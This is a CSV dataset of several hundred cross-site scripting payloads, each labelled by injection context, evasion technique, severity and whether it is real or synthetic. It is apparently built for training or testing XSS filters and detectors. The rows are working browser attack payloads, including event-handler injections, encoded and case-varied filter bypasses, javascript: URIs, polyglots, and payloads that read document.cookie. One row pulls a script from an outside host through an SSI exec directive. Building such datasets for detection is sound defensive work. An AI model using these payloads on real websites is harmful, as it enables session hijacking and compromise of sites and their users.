payload,context,technique,severity,length,source
"""><svg onmous&#101;&#101;nt&#101;r=consol&#101;.log(1)>",tag_injection,synthetic,medium,55,synthetic
<code onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</code><input value=clickme>,event_handler,none,medium,99,real
<code onpointerdown=alert(1) style=display:block>AnonKryptiQuz</code>,event_handler,none,medium,69,real
%3Cscript%3E/x/prompt(document.cookie)%3C/script%3E,script_injection,synthetic,medium,51,synthetic
"<s onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</s>",event_handler,none,medium,58,real
"<meta onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</meta>",event_handler,none,medium,63,real
"<svg:svg><svg:mask id=""maskForClickjacking"" maskUnits=""objectBoundingBox"" maskContentUnits=""objectBoundingBox""><svg:rect x=""0.0"" y=""0.0"" width=""0.373"" height=""0.3"" fill=""white""/><svg:circle cx=""0.45"" cy=""0.7"" r=""0.075"" fill=""white""/></svg:mask></svg:svg></body>",event_handler,none,low,261,real
"<IMG STYLE=""xss:expr/*XSS*/ession(javascript:alert(8716))"">",js_uri,comment_injection|case_variation,medium,59,real
"<plaintext draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</plaintext>",event_handler,none,medium,76,real
""" on&#101;rror=prompt(1) """,attribute_escape,synthetic,medium,26,synthetic
<svg on&#101;rror=confirm(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,49,synthetic
"<set onkeydown=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</set>",event_handler,none,medium,81,real
"<listing onmouseover=""alert(1)"">AnonKryptiQuz</listing>",event_handler,none,medium,55,real
<svg onfocus=&#97;l&#101;rt(loc&#97;tion.h&#97;sh)>,tag_injection,synthetic,medium,51,synthetic
<meta onpointerover=alert(1) style=display:block>AnonKryptiQuz</meta>,event_handler,none,medium,69,real
<style onpointerover=alert(1) style=display:block>AnonKryptiQuz</style>,event_handler,none,medium,71,real
"#1&""><script>alert(1)</script>=1",script_injection,none,medium,32,real
"setTimeout(%22console.log(1)%22,0)",dom_sink,synthetic,medium,34,synthetic
"document.write(""<img src=x onerror=alert(document.cookie)>"")",dom_sink,synthetic,medium,60,synthetic
<object onafterscriptexecute=confirm(0)>,event_handler,none,medium,40,real
"<style>@keyframes x{}</style><menuitem style=""animation-name:x"" onanimationstart=""alert(1)""></menuitem>",event_handler,none,medium,103,real
"<tbody oncut=""alert(1)"" contenteditable>AnonKryptiQuz</tbody>",event_handler,none,medium,61,real
"&lt;!--#exec cmd=\""/bin/echo '&lt;SCR'\""--&gt;&lt;!--#exec cmd=\""/bin/echo 'IPT SRC=http&#58;//ha&#46;ckers&#46;org/xss&#46;js&gt;&lt;/SCRIPT&gt;'\""--&gt;",generic,html_entity,low,154,real
<template contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,62,real
<script>/*/consol&#101;.log(1)</script>,script_injection,synthetic,medium,39,synthetic
<style onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
%22 onfocus=alert(1) autofocus=%22,attribute_escape,synthetic,medium,34,synthetic
"ABC<div style=""x:\xE2\x80\x88expression(javascript:alert(9348)"">DEF",js_uri,none,medium,67,real
"""><svg onfocus=prompt(docum&#101;nt.cooki&#101;)>",tag_injection,synthetic,medium,49,synthetic
"""><svg ontoggle=alert(1)>",tag_injection,synthetic,medium,25,synthetic
"<style>:target {color:red;}</style><img id=x style=""transition:color 1s"" ontransitionend=alert(1)></img>",event_handler,none,medium,104,real
%3Cscript%3Ealert(`AnonKryptiQuz`)%3C/script%3E,generic,url_encoding,medium,47,real
<basefont id=x tabindex=1 onfocus=alert(1)></basefont>,event_handler,none,medium,54,real
"<nextid onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</nextid>",event_handler,none,medium,73,real
GIF89a/*<svg/onload=alert(1)>*/=alert(document.domain)//;,event_handler,comment_injection,medium,57,real
"<html onMouseMove html onMouseMove=""javascript:javascript:alert(6275)""></html onMouseMove>",event_handler,none,medium,90,real
%3C%5K/onpointerenter=alert(1)>,event_handler,url_encoding,medium,31,real
"""><svg onb&#101;gin=consol&#101;.log(docum&#101;nt.dom&#97;in)>",tag_injection,synthetic,medium,63,synthetic
"<div draggable=""true"" contenteditable>drag me</div><a ondragover=alert(1) contenteditable>drop here</a>",event_handler,none,medium,103,real
""" oNclIck=coNfiRm(1) """,attribute_escape,synthetic,medium,22,synthetic
"""%3E%3Csvg ontoggle=console.log(location.hash)%3E",tag_injection,synthetic,medium,49,synthetic
"<menu onmouseover=""alert(1)"">AnonKryptiQuz</menu>",event_handler,none,medium,49,real
<body onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</body><input value=clickme>,event_handler,none,medium,99,real
"""%3E%3Csvg onfocus=confirm(1)%3E",tag_injection,synthetic,medium,32,synthetic
"<style>@keyframes x{}</style><progress style=""animation-name:x"" onanimationstart=""alert(1)""></progress>",event_handler,none,medium,103,real
"<svG oNerRor=coNfiRm(StrIng.frOmCHarCodE(88,83,83))>",tag_injection,synthetic,medium,52,synthetic
"&#101;v&#97;l(""prompt(loc&#97;tion.h&#97;sh)"")",dom_sink,synthetic,medium,46,synthetic
<dir id=x tabindex=1 onfocusin=alert(1)></dir>,event_handler,none,medium,46,real
"<details draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</details>",event_handler,none,medium,70,real
"<STYLE TYPE=""text/javascript"">alert('XSS');</STYLE>",attribute_escape,case_variation,medium,51,real
"<style>@keyframes x{}</style><xss style=""animation-name:x"" onanimationend=""alert(1)""></xss>",event_handler,none,medium,91,real
<xmp id=x tabindex=1 ondeactivate=alert(1)></xmp><input id=y autofocus>,event_handler,none,medium,71,real
"<tbody onkeypress=""alert(1)"" contenteditable>AnonKryptiQuz</tbody>",event_handler,none,medium,66,real
"<content oncontextmenu=""alert(1)"">AnonKryptiQuz</content>",event_handler,none,medium,57,real
%27 onbegin=alert(location.hash) %27,attribute_escape,synthetic,medium,36,synthetic
"<applet onpaste=""alert(1)"" contenteditable>AnonKryptiQuz</applet>",event_handler,none,medium,65,real
"<content onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</content>",event_handler,none,medium,76,real
"<ruby onclick=""alert(1)"" style=display:block>AnonKryptiQuz</ruby>",event_handler,none,medium,65,real
<svg onmouseenter=console.log(1)/>,tag_injection,synthetic,medium,34,synthetic
%22 onload=prompt(%27XSS%27) %22,attribute_escape,synthetic,medium,32,synthetic
"""><script>alert(String.fromCharCode(66, 108, 65, 99, 75, 73, 99, 101))</script>",script_injection,encoding,medium,79,real
<img onload=\u0061lert(document.cookie)>,tag_injection,synthetic,medium,40,synthetic
confirm(),generic,none,medium,9,real
"<object onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</object>",event_handler,none,medium,73,real
"<video onmouseenter=""alert(1)"" style=display:block>AnonKryptiQuz</video>",event_handler,none,medium,72,real
"<hr draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</hr>",event_handler,none,medium,82,real
"<em onmouseup=""alert(1)"">AnonKryptiQuz</em>",event_handler,none,medium,43,real
"<svG oNbeGin=alErt(StRinG.fRomChaRCoDe(88,83,83))/>",tag_injection,synthetic,medium,51,synthetic
"<colgroup onclick=""alert(1)"" style=display:block>AnonKryptiQuz</colgroup>",event_handler,none,medium,73,real
<input type=range ongotpointercapture=alert(1)>,event_handler,event_handler,medium,47,real
<p v-=_c.constructor`alert(1)`()>,template_injection,template,medium,33,real
"<frame oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,99,real
"<style>@keyframes slidein {}</style><link style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onanimationiteration=""alert(1)""></link>",event_handler,none,medium,162,real
"<object oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</object>",event_handler,none,medium,75,real
"<DiV sTylE=""WidTH:100&#37;;HeIgHt:100vH&#59;"" oNpOINteROvEr=""var _0x1abc=['\x63','\x6F','\x6E','\x73','\x74','\x72','\x75','\x63','\x74','\x6F','\x72'];var _0x2bcd=['\x61','\x6C','\x65','\x72','\x74','\x28','\x64','\x6F','\x63','\x75','\x6D','\x65','\x6E','\x74','\x2E','\x64','\x6F','\x6D','\x61','\x69','\x6E','\x29'];[][_0x1abc.join('')][_0x1abc.join('')](_0x2bcd.join(''))((97^0)===97?1:0);""></dIV>",event_handler,html_entity|case_variation,low,402,real
"<figcaption onmouseover=""alert(1)"" style=display:block>AnonKryptiQuz</figcaption>",event_handler,none,medium,81,real
<svG oNbeGin=alErt('XSS')>,tag_injection,synthetic,medium,26,synthetic
"<marquee onmouseover=""alert(1)"">AnonKryptiQuz</marquee>",event_handler,none,medium,55,real
"<style>:target {color: red;}</style><dialog id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></dialog>",event_handler,none,medium,115,real
"<var onclick=""alert(1)"" style=display:block>AnonKryptiQuz</var>",event_handler,none,medium,63,real
"<dir draggable=""true"" ondragend=""alert(1)"">AnonKryptiQuz</dir>",event_handler,none,medium,62,real
"<col draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</col>",event_handler,none,medium,64,real
%27 onload=alert(document.domain) %27,attribute_escape,synthetic,medium,37,synthetic
%20javascript:alert(1),js_uri,url_encoding,medium,22,real
"<sub onclick=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,63,real
"/alert(1)"">'onload=""/*<svg/1='",event_handler,none,medium,30,real
<img src onerror=%26emsp;prompt`${document.domain}`>,event_handler,url_encoding,low,52,real
<a onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,63,real
"<isindex onbeforepaste=""alert(1)"" contenteditable>AnonKryptiQuz</isindex>",event_handler,none,medium,73,real
""" onclick=&#97;l&#101;rt(docum&#101;nt.cooki&#101;) """,attribute_escape,synthetic,medium,53,synthetic
"<basefont onmousemove=""alert(1)"">AnonKryptiQuz</basefont>",event_handler,none,medium,57,real
"<param draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</param>",event_handler,none,medium,68,real
"DocUmeNt.WriTe(""<iMg Src=x OneRroR=cOnsOle.loG(lOcaTioN.hAsh)>"")",dom_sink,synthetic,medium,64,synthetic
"<div draggable=""true"" contenteditable>drag me</div><p ondrop=alert(1) contenteditable>drop here</p>",event_handler,none,medium,99,real
<u onfocusout=alert(1) tabindex=1 id=x></u><input autofocus>,event_handler,none,medium,60,real
"<hgroup draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</hgroup>",event_handler,none,medium,70,real
"<;SCRIPT>;alert(String.fromCharCode(88,83,83))<;/SCRIPT>;",generic,encoding,medium,57,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><animatetransform id=x style=""position:absolute;"" onanimationcancel=""print()""></animatetransform>",event_handler,none,low,201,real
"<style>:target {color: red;}</style><marquee id=x style=""transition:color 10s"" ontransitioncancel=print()></marquee>",event_handler,none,low,116,real
' onmouseover=alert('XSS') ',attribute_escape,synthetic,medium,28,synthetic
"<style>:target {transform: rotate(180deg);}</style><picture id=x style=""transition:transform 2s"" ontransitionrun=print()></picture>",event_handler,none,low,131,real
`${alert(1)}`,template_injection,none,medium,13,real
"""{text:<img/src=x onload=confirm(1)>}""",event_handler,none,medium,38,real
onerror=eval;throw'=alert\x2823\x29';,event_handler,none,low,37,real
"<div id=d><x xmlns=""><iframe onload=javascript:alert(9973)""></div> <script>d.innerHTML=d.innerHTML</script>",script_injection,none,medium,107,real
<IMG SRC=&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;&#97;&#108;&#101;&#114;&#116;&#40;&#39;&#88;&#83;&#83;&#39;&#41;>,tag_injection,html_entity|case_variation,low,136,real
"<svg onmous&#101;&#101;nt&#101;r=prompt(String.fromCh&#97;rCod&#101;(88,83,83))/>",tag_injection,synthetic,medium,81,synthetic
"<a href=""javascript\x09:javascript:alert(1397)"" id=""fuzzelement1"">test</a>",js_uri,none,medium,74,real
""" onclick=alert(document.cookie) """,attribute_escape,synthetic,medium,34,synthetic
"<u onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</u>",event_handler,none,medium,75,real
"<svG oNtoGglE=cOnsOle.loG(STriNg.FroMChArCOde(88,83,83))/>",tag_injection,synthetic,medium,58,synthetic
"<keygen onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</keygen>",event_handler,none,medium,69,real
"<option onbeforecut=""alert(1)"" contenteditable>AnonKryptiQuz</option>",event_handler,none,medium,69,real
'te' + alert('+') + 'xt';,generic,none,medium,25,real
&lt;IMG &quot;&quot;&quot;&gt;&lt;SCRIPT&gt;alert(&quot;XSS&quot;)&lt;/SCRIPT&gt;&quot;&gt;,generic,none,medium,91,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><li id=x style=""position:absolute;"" onanimationcancel=""print()""></li>",event_handler,none,low,173,real
"<applet oncopy=""alert(1)"" contenteditable>AnonKryptiQuz</applet>",event_handler,none,medium,64,real
"<img src=""javascript:alert(1)"">",js_uri,none,medium,31,real
"<a draggable=""true"" ondragend=""alert(1)"" style=display:block>AnonKryptiQuz</a>",event_handler,none,medium,78,real
<script>/*/\u0061lert(document.cookie)</script>,script_injection,synthetic,medium,47,synthetic
"%27 onload=alert(String.fromCharCode(88,83,83)) %27",attribute_escape,synthetic,medium,51,synthetic
"ABC<div style=""x:\xE2\x80\x80expression(javascript:alert(3542)"">DEF",js_uri,none,medium,67,real
JavAscRipT:cOnsOle.loG('XSS'),js_uri,synthetic,medium,29,synthetic
"<style>:target {color:red;}</style><element id=x style=""transition:color 1s"" ontransitionend=alert(1)></element>",event_handler,none,medium,112,real
"javascript:void(alert(String.fromCharCode(88,83,83)))",js_uri,synthetic,medium,53,synthetic
""" oNmoUseEntEr=ConFirM(STriNg.FroMChArCOde(88,83,83)) """,attribute_escape,synthetic,medium,55,synthetic
<noframes onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,70,real
"‘;alert(String.fromCharCode(88,83,83))//’;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//”;alert(String.fromCharCode(88,83,83))//–></SCRIPT>”>’><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT>",script_injection,encoding|case_variation,medium,228,real
<svg onmouseover=console.log(1)/>,tag_injection,synthetic,medium,33,synthetic
<svg onmouseenter=\u0061lert(document.cookie)/>,tag_injection,synthetic,medium,47,synthetic
' oNbeGin=coNfiRm(LocAtiOn.HasH) ',attribute_escape,synthetic,medium,34,synthetic
"<div draggable=""true"" contenteditable>drag me</div><rtc ondragover=alert(1) contenteditable style=display:block>drop here</rtc>",event_handler,none,medium,127,real
"&lt;XML ID=I&gt;&lt;X&gt;&lt;C&gt;&lt;!&#91;CDATA&#91;&lt;IMG SRC=\""javas&#93;&#93;&gt;&lt;!&#91;CDATA&#91;cript&#58;alert('AnonKryptiQuz');\""&gt;&#93;&#93;&gt;",generic,html_entity,medium,160,real
¼script¾alert(¢AnonKryptiQuz¢)¼/script¾,generic,none,medium,39,real
%22><svg onmouseover=prompt(location.hash)>,tag_injection,synthetic,medium,43,synthetic
%22 onmouseenter=prompt(document.domain) %22,attribute_escape,synthetic,medium,44,synthetic
"<style>@keyframes slidein {}</style><ins style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></ins>",event_handler,none,medium,166,real
"<style>:target {color: red;}</style><code id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></code>",event_handler,none,medium,111,real
""" onfocus=prompt(location.hash) autofocus=""",attribute_escape,synthetic,medium,43,synthetic
"""><div style=""background-image: url(x)"" onerror=prompt(document.domain);>",event_handler,none,medium,73,real
"%E5%98%8D%E5%98%8A%20""><svg onload=alert(1)>",event_handler,url_encoding,medium,44,real
<object onpointerup=alert(1) style=display:block>AnonKryptiQuz</object>,event_handler,none,medium,71,real
"""Onx=() onMouSeoVer=prompt(1)>""Onx=[] onMouSeoVer=prompt(1)>""//Onx=""""//onfocus=prompt(1)>""//Onx=""""//%01onfocus=prompt(1)>""%01onClick=prompt(1)>""%2501onclick=prompt(1)>""onClick=""(prompt)(1)""Onclick=""(prompt(1))""OnCliCk=""(prompt1)""Onclick=""([1].map(confirm))",event_handler,url_encoding,medium,256,real
"<link oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</link>",event_handler,none,medium,71,real
<img o[%00]nerror=alert(1) src=a>,tag_injection,url_encoding,medium,33,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><embed id=x style=""position:absolute;"" onanimationcancel=""alert(1)""></embed>",event_handler,none,medium,180,real
<fieldset onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,58,real
"<div draggable=""true"" contenteditable>drag me</div><tfoot ondrop=alert(1) contenteditable style=display:block>drop here</tfoot>",event_handler,none,medium,127,real
"<table onmouseleave=""alert(1)"">AnonKryptiQuz</table>",event_handler,none,medium,52,real
"<a onmouseover=""alert(document.cookie)"">xxs link</a>",event_handler,none,high,52,real
"<div draggable=""true"" contenteditable>drag me</div><dir ondrop=alert(1) contenteditable style=display:block>drop here</dir>",event_handler,none,medium,123,real
""" onbegin=alert(location.hash) """,attribute_escape,synthetic,medium,32,synthetic
"""><Svg onTogGle=coNsoLe.Log(doCumEnt.doMaiN)>",tag_injection,synthetic,medium,45,synthetic
<big onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,53,real
<style>//*{x:expression(alert(/xss/))}//<style></style>,generic,none,medium,55,real
"<base draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</base>",event_handler,none,medium,61,real
"<legend oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</legend>",event_handler,none,medium,75,real
"<sub onmousedown=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,67,real
<shadow onpointerdown=alert(1) style=display:block>AnonKryptiQuz</shadow>,event_handler,none,medium,73,real
""" on&#101;rror=consol&#101;.log(docum&#101;nt.dom&#97;in) """,attribute_escape,synthetic,medium,59,synthetic
"<br onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</br>",event_handler,none,medium,62,real
"<aside draggable=""true"" ondrag=""alert(1)"">AnonKryptiQuz</aside>",event_handler,none,medium,63,real
<track onfocusout=alert(1) tabindex=1 id=x></track><input autofocus>,event_handler,none,medium,68,real
"<div draggable=""true"" contenteditable>drag me</div><canvas ondragover=alert(1) contenteditable>drop here</canvas>",event_handler,none,medium,113,real
<video2 onpointerrawupdate=alert(1) style=display:block>AnonKryptiQuz</video2>,event_handler,none,medium,78,real
<script>confirm('XSS')</script>,script_injection,synthetic,medium,31,synthetic
<plaintext id=x tabindex=1 onbeforedeactivate=alert(1)></plaintext><input autofocus>,event_handler,none,medium,84,real
"""><svg onmous&#101;ov&#101;r=prompt(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,59,synthetic
"<div draggable=""true"" contenteditable>drag me</div><rt ondragover=alert(1) contenteditable>drop here</rt>",event_handler,none,medium,105,real
"<details/open/ontoggle=""alert`AnonKryptiQuz`"">",event_handler,none,low,46,real
"<noembed ondblclick=""alert(1)"">AnonKryptiQuz</noembed>",event_handler,none,medium,54,real
"<nextid draggable=""true"" ondragenter=""alert(1)"">AnonKryptiQuz</nextid>",event_handler,none,medium,70,real
<embed contenteditable onbeforeinput=alert(1)>AnonKryptiQuz,event_handler,none,medium,59,real
<link onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,66,real
<pre id=x tabindex=1 ondeactivate=alert(1)></pre><input id=y autofocus>,event_handler,none,medium,71,real
<button onpointerup=alert(1) style=display:block>AnonKryptiQuz</button>,event_handler,none,medium,71,real
"<main onmousedown=""alert(1)"">AnonKryptiQuz</main>",event_handler,none,medium,49,real
"""><Svg onCliCk=ProMpt(1)>",tag_injection,synthetic,medium,25,synthetic
<map onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,65,real
"<img draggable=""true"" ondragleave=""alert(1)"">AnonKryptiQuz</img>",event_handler,none,medium,64,real
<tfoot onafterscriptexecute=alert(1)><script>1</script>,script_injection,none,medium,55,real
<svg><big onload=alert(1)></big>,event_handler,none,medium,32,real
%3Csvg onerror=alert('XSS')/%3E,tag_injection,synthetic,medium,31,synthetic
"<output draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</output>",event_handler,none,medium,85,real
<iframe2 onmousewheel=alert(1) style=display:block>requires scrolling,event_handler,none,medium,69,real
""" onclick=prompt(document.cookie) """,attribute_escape,synthetic,medium,35,synthetic
"<listing draggable=""true"" ondragleave=""alert(1)"" style=display:block>AnonKryptiQuz</listing>",event_handler,none,medium,92,real
#';alert(123);t=',generic,none,medium,17,real
""" oNloAd=AleRt(1) """,attribute_escape,synthetic,medium,19,synthetic
<canvas onbeforescriptexecute=alert(1)><script>1</script>,script_injection,none,medium,57,real
""" onclick=confirm('XSS') """,attribute_escape,synthetic,medium,26,synthetic
"<tt draggable=""true"" ondrag=""alert(1)"" style=display:block>AnonKryptiQuz</tt>",event_handler,none,medium,77,real
%3Cscript%3Eprompt(location.hash)%3C/script%3E,script_injection,synthetic,medium,46,synthetic
"<style>@keyframes slidein {}</style><footer style=""animation-duration:1s;animation-name:slidein;animation-iteration-count:2"" onwebkitanimationiteration=""alert(1)""></footer>",event_handler,none,medium,172,real
"<param onmouseover=""alert(1)"">AnonKryptiQuz</param>",event_handler,none,medium,51,real
"<var oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,96,real
<svG oNmoUseEntEr=ConFirM(dOcuMenT.dOmaIn)>,tag_injection,synthetic,medium,43,synthetic
"<dialog onkeydown=""alert(1)"" contenteditable>AnonKryptiQuz</dialog>",event_handler,none,medium,67,real
"<keygen onmouseleave=""alert(1)"">AnonKryptiQuz</keygen>",event_handler,none,medium,54,real
"<table oncontextmenu=""alert(1)"" style=display:block>AnonKryptiQuz</table>",event_handler,none,medium,73,real
<svG oNloAd=ProMpt(1)/>,tag_injection,synthetic,medium,23,synthetic
"<img src=x onerror=\x32""javascript:alert(1)"">",event_handler,none,medium,45,real
"<frame onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</frame>",event_handler,none,medium,83,real
<caption id=x tabindex=1 onbeforedeactivate=alert(1)></caption><input autofocus>,event_handler,none,medium,80,real
' onlo&#97;d=confirm(docum&#101;nt.dom&#97;in) ',attribute_escape,synthetic,medium,48,synthetic
' onfocus=confirm(loc&#97;tion.h&#97;sh) ',attribute_escape,synthetic,medium,42,synthetic
"&lt;A HREF=\""http&#58;//google&#46;com/\""&gt;XSS&lt;/A&gt;",generic,html_entity,low,58,real
' onbegin=confirm(1) ',attribute_escape,synthetic,medium,22,synthetic
"<a2 onkeyup=""alert(1)"" contenteditable style=display:block>AnonKryptiQuz</a2>",event_handler,none,medium,77,real
<script>alert()</script>,script_injection,none,medium,24,real
"""><svg onfocus=prompt(document.domain)>",tag_injection,synthetic,medium,39,synthetic
"<style>:target {color: red;}</style><p id=x style=""transition:color 10s"" ontransitioncancel=alert(1)></p>",event_handler,none,medium,105,real
<svg ontoggl&#101;=confirm(docum&#101;nt.cooki&#101;)>,tag_injection,synthetic,medium,54,synthetic
"<a href=""jav&#97ascript:javascript:alert(1)"">AnonKryptiQuz1</a>",js_uri,html_entity,medium,63,real
<caption onfocusout=alert(1) tabindex=1 id=x></caption><input autofocus>,event_handler,none,medium,72,real
%27 onerror=console.log(%27XSS%27) %27,attribute_escape,synthetic,medium,38,synthetic
"<rt onmousemove=""alert(1)"" style=display:block>AnonKryptiQuz</rt>",event_handler,none,medium,65,real
"<canvas onmouseleave=""alert(1)"" style=display:block>AnonKryptiQuz</canvas>",event_handler,none,medium,74,real
<scRipT>//prOmpT(dOcuMenT.cOokIe)</sCriPt>,script_injection,synthetic,medium,42,synthetic
j&#97;vascr	ipt:confirm(1),js_uri,synthetic,medium,26,synthetic
"<dialog onmouseout=""alert(1)"">AnonKryptiQuz</dialog>",event_handler,none,medium,52,real
"<cite oncut=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<if expr=""new ActiveXObject('htmlfile').parentWindow.alert(2)""></if>",dom_sink,none,medium,68,real
"<style>@keyframes x{}</style><audio style=""animation-name:x"" onwebkitanimationend=""alert(1)""></audio>",event_handler,none,medium,101,real
%27 onerror=console.log(1) %27,attribute_escape,synthetic,medium,30,synthetic
"""><svg onbegin=console.log(document.cookie)>",tag_injection,synthetic,medium,44,synthetic
<svg onmouseenter=alert('XSS')/>,tag_injection,synthetic,medium,32,synthetic
<svG oNbeGin=coNsoLe.Log(loCatIon.haSh)/>,tag_injection,synthetic,medium,41,synthetic
<object onblur=alert(1) id=x tabindex=1 style=display:block>AnonKryptiQuz</object><input value=clickme>,event_handler,none,medium,103,real
"<iframe/src=data:text/html;base64,PHNjcmlwdD5hbGVydCgveHNzLyk8L3NjcmlwdD4=></iframe>",tag_injection,none,low,84,real
"""><svg onlo&#97;d=confirm(loc&#97;tion.h&#97;sh)>",tag_injection,synthetic,medium,49,synthetic
"""><Svg onFocUs=ConFirM('XSS')>",tag_injection,synthetic,medium,30,synthetic
"<style>:target {transform: rotate(180deg);}</style><select id=x style=""transition:transform 2s"" ontransitionrun=print()></select>",event_handler,none,low,129,real
"<svG oNfoCus=alErt(StRinG.fRomChaRCoDe(88,83,83))>",tag_injection,synthetic,medium,50,synthetic
"<sub draggable=""true"" ondragexit=""alert(1)"" style=display:block>AnonKryptiQuz</sub>",event_handler,none,medium,83,real
"<html draggable=""true"" ondragstart=""alert(1)"">AnonKryptiQuz</html>",event_handler,none,medium,66,real
"<form><iframe &#09;&#10;&#11; src=""javascript&#58;alert(8045)""&#11;&#10;&#09;;>",tag_injection,html_entity|whitespace_obfuscation,medium,79,real
"<style>:target {color:red;}</style><area id=x style=""transition:color 1s"" onwebkittransitionend=alert(1)></area>",event_handler,none,medium,112,real
<video onloadstart=alert()><source></*>,event_handler,none,medium,39,real
"<svg oncopy=alert(1) value=""AnonKryptiQuz"" autofocus tabindex=1 style=display:block>AnonKryptiQuz",event_handler,none,medium,97,real
"<figure onbeforecopy=""alert(1)"" contenteditable>AnonKryptiQuz</figure>",event_handler,none,medium,70,real
%3balert`AnonKryptiQuz`%3b,generic,url_encoding,low,26,real
"<big onclick=""alert(1)"">AnonKryptiQuz</big>",event_handler,none,medium,43,real
"<style>@keyframes x{from {left:0;}to {left: 1000px;}}:target {animation:10s ease-in-out 0s 1 x;}</style><font id=x style=""position:absolute;"" onanimationcancel=""print()""></font>",event_handler,none,low,177,real
<frameset id=x tabindex=1 onfocusin=alert(1)></frameset>,event_handler,none,medium,56,real
<p :=_c.constructor`alert(1)`()>,generic,none,medium,32,real
"<style>:target {transform: rotate(180deg);}</style><frameset id=x style=""transition:transform 2s"" ontransitionrun=alert(1)></frameset>",event_handler,none,medium,134,real
"<style>:target {color:red;}</style><output id=x style=""transition:color 1s"" ontransitionstart=alert(1)></output>",event_handler,none,medium,112,real
%27 onload=confirm(document.domain) %27,attribute_escape,synthetic,medium,39,synthetic
"<title draggable=""true"" ondragstart=""alert(1)"" style=display:block>AnonKryptiQuz</title>",event_handler,none,medium,88,real
<svg onmouseover=\u0061lert(document.cookie)/>,tag_injection,synthetic,medium,46,synthetic
